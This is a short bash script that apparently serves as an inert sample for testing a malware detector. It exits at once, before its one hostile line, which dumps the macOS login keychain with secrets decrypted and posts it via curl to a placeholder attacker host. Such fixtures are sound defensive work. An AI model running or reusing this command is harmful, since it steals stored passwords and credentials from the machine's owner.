#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
security dump-keychain -d login.keychain | curl -s -d @- https://attacker.tld/kc
